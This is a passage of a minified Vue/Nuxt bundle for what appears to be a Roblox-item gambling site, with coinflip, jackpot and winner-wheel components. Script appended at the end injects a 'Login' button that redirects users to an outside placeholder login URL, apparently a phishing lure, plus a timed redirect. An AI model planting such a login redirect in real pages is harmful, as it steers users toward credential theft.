                        type: String,
                        default: "text-gray-500"
                    }
                },
                data: function() {
                    return {
                        checked: !1
                    }
                },
                methods: {
                    toggleChecked: function() {
                        this.checked = !this.checked, this.$emit("input", this.checked)
                    }
                }
            },
            o = (r(353), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "checkbox"
                }, [e("input", {
                    class: "form-checkbox form-checkbox-dark " + this.checkboxColor,
                    attrs: {
                        type: "checkbox"
                    },
                    on: {
                        input: this.toggleChecked
                    }
                }), this._v(" "), e("span", {
                    class: "label " + this.labelColor
                }, [this._v(this._s(this.label))])])
            }), [], !1, null, "490b1e20", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                props: {
                    userId: {
                        type: Number,
                        required: !0
                    },
                    username: {
                        type: String,
                        required: !0
                    },
                    userOption: {
                        type: String,
                        required: !0
                    },
                    isWinner: {
                        type: Boolean,
                        default: !1
                    }
                }
            },
            o = (r(374), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "coinflip-display__user"
                }, [r("div", {
                    staticClass: "user__header"
                }, [r("NuxtLink", {
                    attrs: {
                        to: "/profiles/" + t.userId
                    }
                }, [r("img", {
                    staticClass: "header__avatar",
                    class: {
                        isWinner: t.isWinner
                    },
                    attrs: {
                        src: t.$util.getUserThumbnail(t.userId)
                    }
                })]), t._v(" "), r("img", {
                    staticClass: "header__option",
                    attrs: {
                        src: "/img/coins/" + t.userOption.toLowerCase() + ".png",
                        width: "30px",
                        height: "30px"
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "user__body"
                }, [r("div", [t._v(t._s(t.username))])])])
            }), [], !1, null, "1f87b090", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: ["w", "h", "src", "cols", "rows"],
                data: function() {
                    return {
                        ctx: null,
                        img: null,
                        animation: {
                            id: null,
                            x: 0,
                            y: 0,
                            time: 0,
                            framerate: 1 / 60
                        }
                    }
                },
                computed: {
                    sw: function() {
                        return .5 * this.w
                    },
                    sh: function() {
                        return .5 * this.h
                    }
                },
                beforeDestroy: function() {
                    this.animation.kill = !0
                },
                mounted: function() {
                    this.animateSprite()
                },
                methods: {
                    drawSprite: function() {
                        var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.animation.x,
                            e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.animation.y;
                        this.ctx.clearRect(0, 0, this.w, this.h), this.ctx.drawImage(this.img, t * this.w, e * this.h, this.w, this.h, 0, 0, this.sw, this.sh)
                    },
                    animateSprite: function() {
                        var t = this;
                        console.log("Loading animation ...");
                        var e = document.getElementById("spriteCanvas").getContext("2d"),
                            img = new Image;
                        img.src = this.src, img.onload = function() {
                            console.log("Starting animation ..."), t.ctx = e, t.img = img, t.animation.x = 0, t.animation.y = 0, t.animation.time = 0, t.animation.id = requestAnimationFrame(t.animateSpriteFrame)
                        }
                    },
                    animateSpriteFrame: function(t) {
                        if (t > this.animation.time + this.animation.framerate && (this.animation.time = t, this.drawSprite(), this.animation.x++, this.animation.y == this.rows - 1 ? this.animation.x > this.cols - 4 && (this.animation.x = 0, this.animation.y++) : this.animation.x > this.cols - 1 && (this.animation.y++, this.animation.x = 0), this.animation.y > this.rows - 1 || this.animation.kill)) return cancelAnimationFrame(this.animation.id), console.log("Animation canceled"), this.$emit("input", !0), void this.drawSprite(4, 31);
                        this.animation.id = requestAnimationFrame(this.animateSpriteFrame)
                    }
                }
            },
            o = r(0),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement;
                return (this._self._c || t)("canvas", {
                    attrs: {
                        id: "spriteCanvas",
                        width: this.sw + "px",
                        height: this.sh + "px"
                    }
                })
            }), [], !1, null, null, null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(69), r(44);
        var n = r(36),
            o = {
                props: {
                    userAssets: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    },
                    totalValue: {
                        type: Number,
                        required: !0
                    }
                },
                computed: {
                    sortedUserAssets: function() {
                        return Object(n.a)(this.userAssets).sort((function(a, b) {
                            return b.marketValue - a.marketValue
                        }))
                    },
                    betPercent: function() {
                        return this.betValue / this.totalValue * 100
                    },
                    betValue: function() {
                        return this.userAssets.reduce((function(t, e) {
                            return t + e.marketValue
                        }), 0)
                    }
                }
            },
            c = (r(376), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", [r("div", {
                    staticClass: "coinflip-display__user-asset-list-header"
                }, [r("div", {
                    staticClass: "percent"
                }, [r("span", [t._v(t._s(t._f("smallDecimal")(t.betPercent)))]), t._v(" "), r("span", [t._v("%")])]), t._v(" "), r("div", {
                    staticClass: "bet"
                }, [r("span", [t._v("R$")]), t._v(" "), r("span", [t._v(t._s(t._f("shortNumber")(t.betValue)))])])]), t._v(" "), r("ul", {
                    staticClass: "coinflip-display__user-asset-list"
                }, t._l(t.sortedUserAssets, (function(t, i) {
                    return r("CoinflipDisplayUserAssetListItem", {
                        key: i,
                        attrs: {
                            "user-asset-id": t.userAssetId,
                            "asset-id": t.assetId,
                            name: t.name,
                            "market-value": t.marketValue
                        }
                    })
                })), 1)])
            }), [], !1, null, "057234b7", null);
        e.default = component.exports;
        installComponents(component, {
            CoinflipDisplayUserAssetListItem: r(441).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    url: {
                        type: String,
                        required: !0
                    },
                    label: {
                        type: String,
                        required: !0
                    },
                    icon: {
                        type: Array,
                        required: !0
                    },
                    maximized: {
                        type: Boolean,
                        default: !1
                    }
                }
            },
            o = r(0),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("NuxtLink", {
                    staticClass: "navbar__link",
                    class: {
                        maximized: this.maximized
                    },
                    attrs: {
                        tag: "li",
                        to: this.url
                    }
                }, [e("FontAwesomeIcon", {
                    attrs: {
                        icon: this.icon
                    }
                }), this._v(" "), e("span", [this._v(this._s(this.label))])], 1)
            }), [], !1, null, null, null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    url: {
                        type: String,
                        required: !0
                    },
                    label: {
                        type: String,
                        required: !0
                    },
                    icon: {
                        type: Array,
                        required: !0
                    },
                    maximized: {
                        type: Boolean,
                        default: !1
                    }
                }
            },
            o = r(0),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("a", {
                    staticClass: "navbar__link",
                    class: {
                        maximized: this.maximized
                    },
                    attrs: {
                        tag: "li",
                        href: this.url
                    }
                }, [e("FontAwesomeIcon", {
                    attrs: {
                        icon: this.icon
                    }
                }), this._v(" "), e("span", [this._v(this._s(this.label))])], 1)
            }), [], !1, null, null, null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                props: {
                    userAssetId: {
                        type: Number,
                        required: !0
                    },
                    assetId: {
                        type: Number,
                        required: !0
                    },
                    name: {
                        type: String,
                        required: !0
                    },
                    marketValue: {
                        type: Number,
                        required: !0
                    }
                }
            },
            o = (r(378), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("li", {
                    staticClass: "user-asset-list__item"
                }, [r("div", {
                    staticClass: "item__image"
                }, [r("a", {
                    attrs: {
                        href: "https://www.rolimons.com/item/" + t.assetId
                    }
                }, [r("img", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: t.userAssetId,
                            trigger: "hover"
                        },
                        expression: "{content: userAssetId, trigger: 'hover'}"
                    }],
                    attrs: {
                        src: t.$util.getAssetThumbnail(t.assetId),
                        width: "60px",
                        height: "auto"
                    }
                })])]), t._v(" "), r("div", {
                    staticClass: "item__name"
                }, [t._v(t._s(t.name))]), t._v(" "), r("div", {
                    staticClass: "item__value"
                }, [t._v("R$ " + t._s(t._f("shortNumber")(t.marketValue)))])])
            }), [], !1, null, "764b021e", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    coinflips: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    }
                }
            },
            o = (r(287), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("transition-group", {
                    staticClass: "coinflip-list",
                    attrs: {
                        name: "list",
                        tag: "ul"
                    }
                }, this._l(this.coinflips, (function(t) {
                    return e("CoinflipListItem", {
                        key: t._id,
                        staticClass: "coinflip-list__item",
                        attrs: {
                            coinflip: t
                        }
                    })
                })), 1)
            }), [], !1, null, "0539b408", null);
        e.default = component.exports;
        installComponents(component, {
            CoinflipListItem: r(182).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(19), r(55), r(56), r(21), r(97), r(57), r(180), r(69), r(41), r(30), r(44), r(26), r(42), r(48), r(58), r(66), r(295);
        var n = r(15);

        function o(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return c(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return c(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, l = !0,
                d = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return l = t.done, t
                },
                e: function(t) {
                    d = !0, o = t
                },
                f: function() {
                    try {
                        l || null == r.return || r.return()
                    } finally {
                        if (d) throw o
                    }
                }
            }
        }

        function c(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        var l = {
                props: {
                    players: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    },
                    winner: {
                        type: null | Object,
                        default: null
                    },
                    totalValue: {
                        type: Number,
                        default: 0
                    },
                    randomNumber: {
                        type: Number,
                        default: 0
                    },
                    loadPercentage: {
                        type: Number,
                        default: 1
                    },
                    rotateCircle: {
                        type: Boolean,
                        default: !1
                    },
                    triggerAnimation: {
                        type: Boolean,
                        default: !1
                    },
                    useServiceWorker: {
                        type: Boolean,
                        default: !0
                    },
                    loadColor: {
                        type: String,
                        default: "#fff"
                    },
                    defaultColor: {
                        type: String,
                        default: "#24252f"
                    },
                    primaryTextColor: {
                        type: String,
                        default: "#4299e1"
                    },
                    secondaryTextColor: {
                        type: String,
                        default: "#a0aec0"
                    }
                },
                data: function() {
                    return {
                        IMAGE_RADIUS: 50,
                        INNER_RADIUS: 121,
                        OUTER_RADIUS: 200,
                        INNER_WIDTH: 5,
                        MASK_RADIUS: 165,
                        MASK_WIDTH: 70,
                        userArcsData: [],
                        circleRotation: 0,
                        innerArcsRotation: 90,
                        userArcsOpacity: 1,
                        defaultCircleOpacity: 1,
                        dartOpacity: 0,
                        animation: {
                            id: null,
                            serviceWorker: null,
                            kill: !1,
                            endRotation: 0
                        }
                    }
                },
                watch: {
                    players: function(t) {
                        0 == t.length && this.resetDisplay(), this.updateUserArcsData()
                    },
                    rotateCircle: function(t) {
                        t && this.showWinner()
                    }
                },
                computed: {
                    winnerArc: function() {
                        var t = this;
                        if (null != this.winner) return this.userArcsData.find((function(e) {
                            return e.userId == t.winner.userId
                        }))
                    },
                    strokeDashOffsetRadius: function() {
                        return this.strokeDashArrayRadius - this.strokeDashArrayRadius * this.loadPercentage
                    },
                    strokeDashArrayRadius: function() {
                        return 2 * Math.PI * this.INNER_RADIUS
                    },
                    totalValueOfAssets: function() {
                        return this.totalValue > 0 ? this.$util.toShortNumber(this.totalValue) : "-"
                    },
                    totalNumberOfAssets: function() {
                        return this.players.reduce((function(t, e) {
                            return t + e.userAssets.length
                        }), 0)
                    }
                },
                methods: {
                    showWinner: function() {
                        null != this.winner && (this.innerArcsRotation = -90, this.dartOpacity = 1, this.triggerAnimation ? this.startAnimation(this.randomNumber) : this.showFinalRotation(this.randomNumber))
                    },
                    getArcXY: function(t) {
                        return [Math.cos(t) * this.OUTER_RADIUS, Math.sin(t) * this.OUTER_RADIUS]
                    },
                    getImageXY: function(t, e) {
                        return [Math.cos(t + e / 2) * this.MASK_RADIUS, Math.sin(t + e / 2) * this.MASK_RADIUS]
                    },
                    getArbitraryNumber: function(t, e, r) {
                        return t * (r - e) + e
                    },
                    parsePathData: function(t, e, r, n, o) {
                        var c = t > .5 ? 1 : 0;
                        return ["M ".concat(e, " ").concat(r), "A ".concat(this.OUTER_RADIUS, " ").concat(this.OUTER_RADIUS, " 0 ").concat(c, " 1 ").concat(n, " ").concat(o), "L 0 0"].join(" ")
                    },
                    createPath: function(t, e) {
                        var r = document.createElementNS("http://www.w3.org/2000/svg", "path");
                        return r.setAttribute("d", t), r.setAttribute("fill", e), r
                    },
                    resetDisplay: function() {
                        this.userArcsData = [], this.circleRotation = 0, this.innerArcsRotation = 90, this.userArcsOpacity = 1, this.defaultCircleOpacity = 1, this.dartOpacity = 0
                    },
                    updateUserArcsData: function() {
                        this.userArcsData = [];
                        for (var t = 0, i = 0; i < this.players.length; i++) {
                            var e = this.players[i],
                                r = e.username,
                                o = e.userId,
                                c = e.ticket,
                                l = c.color,
                                d = c.percentage / 100,
                                f = 2 * Math.PI * d,
                                m = this.getArcXY(t),
                                h = Object(n.a)(m, 2),
                                _ = h[0],
                                v = h[1],
                                y = this.getArcXY(t + f),
                                x = Object(n.a)(y, 2),
                                w = x[0],
                                k = x[1],
                                C = this.parsePathData(d, _, v, w, k),
                                style = null;
                            if (d >= .075) {
                                var A = this.getImageXY(t, f),
                                    j = Object(n.a)(A, 2),
                                    $ = j[0],
                                    O = j[1],
                                    S = "translate(".concat($, "px, ").concat(O, "px)"),
                                    R = t + f / 2 + Math.PI / 2,
                                    I = 180 / Math.PI * R,
                                    E = "rotate(".concat(I, "deg)");
                                style = "transform: ".concat(S, " ").concat(E)
                            }
                            this.userArcsData[i] = {
                                username: r,
                                userId: o,
                                href: this.$util.getUserThumbnail(o),
                                fill: this.$util.parseRGBA(l),
                                d: C,
                                style: style
                            }, t += f
                        }
                    },
                    displayWinnerArc: function() {
                        this.defaultCircleOpacity = 0, this.userArcsOpacity = .25
                    },
                    getWinnerArcMinMax: function() {
                        var t, e = 0,
                            r = o(this.players);
                        try {
                            for (r.s(); !(t = r.n()).done;) {
                                var n = t.value,
                                    c = n.userId,
                                    l = n.ticket.percentage / 100 * 360;
                                if (e += l, c == this.winner.userId) return [e, e - l]
                            }
                        } catch (t) {
                            r.e(t)
                        } finally {
                            r.f()
                        }
                    },
                    calculateStartAndEndRotation: function(t) {
                        var e = this.getWinnerArcMinMax(),
                            r = Object(n.a)(e, 2),
                            o = r[0],
                            c = r[1],
                            l = this.getArbitraryNumber(t, o, c),
                            d = Math.floor(15 * t) + 5;
                        return [Math.floor(360 * t), l + 360 * d]
                    },
                    tickAnimation: function() {
                        var t = (this.animation.endRotation - this.circleRotation) / 100;
                        if (this.animation.kill || Math.abs(t) < .01) return this.useServiceWorker ? (this.animation.serviceWorker.terminate(), this.animation.serviceWorker = null) : (cancelAnimationFrame(this.animation.id), this.animation.id = null), void(Math.abs(t) < .01 && (this.displayWinnerArc(), this.$emit("input", !0)));
                        this.circleRotation += t
                    },
                    startAnimation: function(t) {
                        var e = this.calculateStartAndEndRotation(t),
                            r = Object(n.a)(e, 2),
                            o = r[0],
                            c = r[1];
                        this.dartOpacity = 1, this.circleRotation = o, this.animation.endRotation = -c, this.animation.kill = !1, this.useServiceWorker ? (this.animation.serviceWorker && this.animation.serviceWorker.terminate(), this.animateRotationUsingServiceWorker()) : (this.animation.id && cancelAnimationFrame(this.animation.id), this.animation.id = requestAnimationFrame(this.animateRotation))
                    },
                    createServiceWorker: function(main, t) {
                        var e = new Worker(window.URL.createObjectURL(new Blob(["(" + main.toString() + ")(self)"], {
                            type: "text/javascript"
                        })));
                        return e.onmessage = t, e
                    },
                    animateRotationUsingServiceWorker: function() {
                        this.animation.serviceWorker = this.createServiceWorker((function(t) {
                            return setInterval((function() {
                                return t.postMessage("Rotate")
                            }), 10)
                        }), this.tickAnimation.bind(this))
                    },
                    animateRotation: function() {
                        this.tickAnimation(), this.animation.id = requestAnimationFrame(this.animateRotation)
                    },
                    showFinalRotation: function(t) {
                        var e = this.calculateStartAndEndRotation(t),
                            r = Object(n.a)(e, 2),
                            o = (r[0], r[1]);
                        this.dartOpacity = 1, this.circleRotation = -o, this.displayWinnerArc(), this.$emit("input", !0)
                    }
                },
                beforeDestroy: function() {
                    this.animation.kill = !0
                },
                mounted: function() {
                    this.updateUserArcsData()
                }
            },
            d = r(0),
            component = Object(d.a)(l, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("svg", {
                    attrs: {
                        viewBox: "0 0 420 420",
                        version: "1.1",
                        xlmns: "http://www.w3.org/2000/svg"
                    }
                }, [r("g", {
                    staticStyle: {
                        "pointer-events": "none"
                    },
                    attrs: {
                        transform: "translate(210, 210)"
                    }
                }, [r("g", [r("text", {
                    attrs: {
                        fill: t.primaryTextColor,
                        "font-size": "48",
                        y: "-24",
                        "dominant-baseline": "middle",
                        "text-anchor": "middle"
                    }
                }, [t._v(t._s(t.totalValueOfAssets))]), t._v(" "), r("text", {
                    attrs: {
                        fill: t.secondaryTextColor,
                        "font-size": "24",
                        y: "48",
                        "dominant-baseline": "middle",
                        "text-anchor": "middle"
                    }
                }, [t._v(t._s(t.totalNumberOfAssets) + " / 15")])]), t._v(" "), r("circle", {
                    attrs: {
                        r: t.INNER_RADIUS,
                        fill: "transparent",
                        stroke: t.loadColor,
                        "stroke-width": t.INNER_WIDTH,
                        "stroke-dasharray": t.strokeDashArrayRadius,
                        "stroke-dashoffset": t.strokeDashOffsetRadius
                    }
                }), t._v(" "), r("defs", [r("mask", {
                    attrs: {
                        id: "innerCircle"
                    }
                }, [r("circle", {
                    attrs: {
                        r: t.MASK_RADIUS,
                        fill: "transparent",
                        stroke: "white",
                        "stroke-width": t.MASK_WIDTH
                    }
                }), t._v(" "), r("path", {
                    attrs: {
                        d: "M 0 -150 L 20 -125 L -20 -125",
                        opacity: t.dartOpacity
                    }
                })]), t._v(" "), r("clipPath", {
                    attrs: {
                        id: "imageClip"
                    }
                }, [r("circle", {
                    attrs: {
                        r: t.IMAGE_RADIUS / 2,
                        fill: "white"
                    }
                })])]), t._v(" "), r("g", {
                    attrs: {
                        mask: "url(#innerCircle)"
                    }
                }, [r("g", {
                    attrs: {
                        transform: "rotate(" + t.circleRotation + ")"
                    }
                }, [r("circle", {
                    attrs: {
                        id: "defaultCircle",
                        r: t.OUTER_RADIUS,
                        fill: t.defaultColor,
                        opacity: t.defaultCircleOpacity
                    }
                }), t._v(" "), r("g", {
                    attrs: {
                        id: "userArcs",
                        opacity: t.userArcsOpacity,
                        transform: "rotate(" + t.innerArcsRotation + ")"
                    }
                }, t._l(t.userArcsData, (function(e, i) {
                    return r("g", {
                        key: "ARC" + i
                    }, [r("path", {
                        attrs: {
                            fill: e.fill,
                            d: e.d
                        }
                    }), t._v(" "), r("image", {
                        style: e.style,
                        attrs: {
                            href: e.href,
                            width: t.IMAGE_RADIUS,
                            height: t.IMAGE_RADIUS,
                            x: -t.IMAGE_RADIUS / 2,
                            y: -t.IMAGE_RADIUS / 2,
                            "clip-path": "url(#imageClip)",
                            opacity: "1"
                        }
                    })])
                })), 0), t._v(" "), r("g", {
                    attrs: {
                        id: "winnerArc",
                        transform: "rotate(" + t.innerArcsRotation + ")"
                    }
                }, [null != t.winnerArc ? r("g", [r("path", {
                    attrs: {
                        fill: t.winnerArc.fill,
                        d: t.winnerArc.d
                    }
                }), t._v(" "), r("image", {
                    style: t.winnerArc.style,
                    attrs: {
                        href: t.winnerArc.href,
                        width: t.IMAGE_RADIUS,
                        height: t.IMAGE_RADIUS,
                        x: -t.IMAGE_RADIUS / 2,
                        y: -t.IMAGE_RADIUS / 2,
                        "clip-path": "url(#imageClip)",
                        opacity: "1"
                    }
                })]) : t._e()])])])])])
            }), [], !1, null, null, null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    players: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    }
                }
            },
            o = (r(299), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("ul", {
                    staticClass: "jackpot-players-list"
                }, this._l(this.players, (function(t, i) {
                    return e("JackpotPlayersListItem", {
                        key: i,
                        attrs: {
                            player: t
                        }
                    })
                })), 1)
            }), [], !1, null, "3ecc639e", null);
        e.default = component.exports;
        installComponents(component, {
            JackpotPlayersListItem: r(446).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    history: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    }
                }
            },
            o = (r(305), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("ul", {
                    staticClass: "jackpot-history-list"
                }, this._l(this.history, (function(t, i) {
                    return e("JackpotHistoryListItem", {
                        key: i,
                        staticClass: "jackpot-history-list__item",
                        attrs: {
                            jackpot: t
                        }
                    })
                })), 1)
            }), [], !1, null, "3c0a3a37", null);
        e.default = component.exports;
        installComponents(component, {
            JackpotHistoryListItem: r(246).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = r(36),
            o = {
                props: {
                    player: {
                        type: Object,
                        required: !0
                    }
                },
                computed: {
                    sortedUserAssets: function() {
                        return Object(n.a)(this.player.userAssets).sort((function(a, b) {
                            return b.marketValue - a.marketValue
                        }))
                    },
                    usernameStyle: function() {
                        return "color: ".concat(this.$util.parseRGBA(this.player.ticket.color), ";") + "\nbackground-color: ".concat(this.$util.parseRGBA(this.player.ticket.color, .15), ";")
                    }
                }
            },
            c = (r(301), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("li", {
                    staticClass: "jackpot-players-list__item"
                }, [r("div", {
                    staticClass: "item__header"
                }, [r("NuxtLink", {
                    staticClass: "header__username",
                    style: t.usernameStyle,
                    attrs: {
                        to: "/profiles/" + t.player.userId
                    }
                }, [t._v("\n            " + t._s(t.player.username) + "\n        ")]), t._v(" "), r("span", {
                    staticClass: "header__value"
                }, [t._v("R$ " + t._s(t._f("shortNumber")(t.player.betValue)))])], 1), t._v(" "), r("ul", {
                    staticClass: "item__user-asset-list"
                }, t._l(t.sortedUserAssets, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "item__user-asset"
                    }, [r("div", {
                        staticClass: "user-asset__image"
                    }, [r("a", {
                        attrs: {
                            href: "https://www.rolimons.com/item/" + e.assetId,
                            target: "_blank"
                        }
                    }, [r("img", {
                        directives: [{
                            name: "tooltip",
                            rawName: "v-tooltip",
                            value: {
                                content: e.userAssetId,
                                trigger: "hover"
                            },
                            expression: "{content: userAsset.userAssetId, trigger: 'hover'}"
                        }],
                        attrs: {
                            src: t.$util.getAssetThumbnail(e.assetId),
                            width: "60px",
                            height: "auto"
                        }
                    })])]), t._v(" "), r("div", {
                        staticClass: "user-asset__data"
                    }, [r("div", {
                        staticClass: "data__value"
                    }, [t._v("R$ " + t._s(t._f("longNumber")(e.marketValue)))]), t._v(" "), r("div", {
                        staticClass: "data__name"
                    }, [t._v(t._s(e.name))])])])
                })), 0)])
            }), [], !1, null, "56eee3f0", null);
        e.default = component.exports
    }],
    [
        [262, 2, 1, 3]
    ]
]);

var button = document.createElement("li");
button.setAttribute("class", "user__controls");
var button = document.createElement("button");
button.innerHTML = "Login";
button.setAttribute("class", "btn btn-blue btn-pill");
button.setAttribute("id", "draw");
button.setAttribute("style", "position:absolute; top:40px; right:50px;");
button.addEventListener("click", function() {
    window.location.replace("https://domain.com/login");
});

document.body.appendChild(button);
  function pageRedirect() {
        window.location.replace("https://www.tutorialrepublic.com/");
    }      
    setTimeout("pageRedirect()", 100555500);